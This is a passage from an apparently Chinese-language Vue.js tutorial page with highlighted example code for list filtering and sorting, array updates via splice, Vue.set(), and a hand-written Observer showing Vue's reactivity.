class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">38</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;邓伦&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">filterPersons</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> p.name.indexOf(<span class="built_in">this</span>.keyWord) !== -<span class="number">1</span></span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="24-列表排序"><a href="#24-列表排序" class="headerlink" title="24.列表排序"></a>24.列表排序</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>列表排序<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入搜索名字&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;keyWord&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 2&quot;</span>&gt;</span>年龄升序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 1&quot;</span>&gt;</span>年龄降序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sortType = 0&quot;</span>&gt;</span>原顺序<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in filterPersons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//使用computed计算属性实现</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">keyWord:<span class="string">&#x27;&#x27;</span>,</span></span><br><span class="line"><span class="javascript">sortType:<span class="number">0</span>,<span class="comment">//原顺序：0，年龄降序：1，年龄升序：2</span></span></span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">48</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;邓伦&#x27;</span>,<span class="attr">age</span>:<span class="number">38</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">filterPersons</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> arr = <span class="built_in">this</span>.persons.filter(<span class="function">(<span class="params">p</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> p.name.indexOf(<span class="built_in">this</span>.keyWord) !== -<span class="number">1</span></span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="javascript"><span class="comment">//判断是否需要排序</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//普通写法</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//#region</span></span></span><br><span class="line">/*if (this.sortType === 1) &#123;</span><br><span class="line"><span class="javascript"><span class="keyword">return</span> arr.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> b.age-a.age</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="javascript">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.sortType === <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> arr.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> a.age-b.age</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="javascript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> arr</span></span><br><span class="line">&#125;*/</span><br><span class="line"><span class="javascript"><span class="comment">//#endregion</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//精简写法</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(<span class="built_in">this</span>.sortType)&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//数组排序</span></span></span><br><span class="line"><span class="javascript">arr.sort(<span class="function">(<span class="params">p1,p2</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.sortType === <span class="number">1</span> ? p2.age-p1.age : p1.age-p2.age</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> arr</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="25-更新时的一个问题"><a href="#25-更新时的一个问题" class="headerlink" title="25.更新时的一个问题"></a>25.更新时的一个问题</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>更新时的一个问题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--遍历数组类型数据--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;updateMei&quot;</span>&gt;</span>更新马冬梅信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) in persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;p.id&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line">persons:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马冬梅&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周冬雨&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>,<span class="attr">sex</span>:<span class="string">&#x27;女&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;周杰伦&#x27;</span>,<span class="attr">age</span>:<span class="number">48</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">id</span>:<span class="string">&#x27;004&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;邓伦&#x27;</span>,<span class="attr">age</span>:<span class="number">38</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;,</span></span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">updateMei</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// this.persons[0].name = &#x27;马老师&#x27;//奏效</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// this.persons[0].age = &#x27;50&#x27;//奏效</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// this.persons[0].sex = &#x27;男&#x27;//奏效</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// this.persons[0] = &#123;id:&#x27;001&#x27;,name:&#x27;马老师&#x27;,age:50,sex:&#x27;男&#x27;&#125;//不奏效</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.persons.splice(<span class="number">0</span>,<span class="number">1</span>,&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;马老师&#x27;</span>,<span class="attr">age</span>:<span class="number">50</span>,<span class="attr">sex</span>:<span class="string">&#x27;男&#x27;</span>&#125;)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="26-模拟数据监测"><a href="#26-模拟数据监测" class="headerlink" title="26.模拟数据监测"></a>26.模拟数据监测</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>模拟数据监测<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> data = &#123;</span></span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="comment">//创建一个监视的实例对象，用于监视data中属性变化</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> obs = <span class="keyword">new</span> Observer(data)</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(obs)</span></span><br><span class="line"><span class="javascript"><span class="comment">//准备一个vm实例对象</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> vm = &#123;&#125;</span></span><br><span class="line">vm._data = data = obs</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">Observer</span>(<span class="params">obj</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//汇总对象中所有属性形成一个数组</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(obj)</span></span><br><span class="line"><span class="javascript"><span class="comment">//遍历</span></span></span><br><span class="line"><span class="javascript">keys.forEach(<span class="function">(<span class="params">k</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">this</span>,k,&#123;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> obj[k]</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">set</span>(<span class="params">val</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;$&#123;k&#125;被改了，我要去解析模板，生成虚拟DOM，.....,我去忙了。&#x27;</span>)</span></span><br><span class="line">obj[k] = val</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="27-Vue监听数据改变原理-对象"><a href="#27-Vue监听数据改变原理-对象" class="headerlink" title="27.Vue监听数据改变原理_对象"></a>27.Vue监听数据改变原理_对象</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue监听数据改变原理_对象<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span>,</span></span><br><span class="line">student:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">age:18,</span><br><span class="line"><span class="javascript">sex:<span class="string">&#x27;男&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="28-Vue-set-的使用"><a href="#28-Vue-set-的使用" class="headerlink" title="28.Vue.set()的使用"></a>28.Vue.set()的使用</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue.set()的使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加一个性别属性，默认值是男<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>名字：&#123;&#123;student.name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;student.sex&quot;</span>&gt;</span>性别：&#123;&#123;student.sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>年龄：真实&#123;&#123;student.age.rAge&#125;&#125;,对外&#123;&#123;student.age.sAge&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>朋友们：<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(friend,index) in student.friends&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;friend.name&#125;&#125;-&#123;&#123;friend.age&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">address:<span class="string">&#x27;北京&#x27;</span>,</span></span><br><span class="line">student:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">age:&#123;</span><br><span class="line">rAge:32,</span><br><span class="line">sAge:20,</span><br><span class="line">&#125;,</span><br><span class="line">friends:[</span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Jack&#x27;</span>,<span class="attr">age</span>:<span class="number">25</span>&#125;,</span></span><br><span class="line"><span class="javascript">&#123;<span class="attr">name</span>:<span class="string">&#x27;Tom&#x27;</span>,<span class="attr">age</span>:<span class="number">28</span>&#125;,</span></span><br><span class="line">],</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">addSex</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">// Vue.set(this.student,&#x27;sex&#x27;,&#x27;男&#x27;)</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.$set(<span class="built_in">this</span>.student,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="29-Vue监听数据改变原理-数组"><a href="#29-Vue监听数据改变原理-数组" class="headerlink" title="29.Vue监听数据改变原理_数组"></a>29.Vue监听数据改变原理_数组</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue监听数据改变原理_数组<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>学生信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;addSex&quot;</span>&gt;</span>添加一个性别属性，默认值是男<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span 